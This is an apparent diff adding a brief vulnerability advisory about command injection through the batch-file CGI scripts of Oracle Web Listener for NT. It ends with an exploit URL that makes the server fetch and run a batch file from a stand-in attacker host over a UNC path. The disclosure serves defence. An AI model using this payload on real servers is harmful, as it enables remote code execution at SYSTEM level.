@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/1053/info
+
+Oracle Web Listener for NT makes use of various batch files as cgi scripts, which are stored in the /ows-bin/ directory by default. 
+
+Any of these batch files can be used to run arbitrary commands on the server, simply by appending '?&' and a command to the filename. The command will be run at the SYSTEM level. The name of a batch file is not even neccessary, as it will translate the '*' character and apply the appended string to every batch file in the directory. Moreover, UNC paths can be used to cause the server to download and execute remote code.
+
+http: //target/ows-bin/*.bat?&\\attacker\getadmin.bat
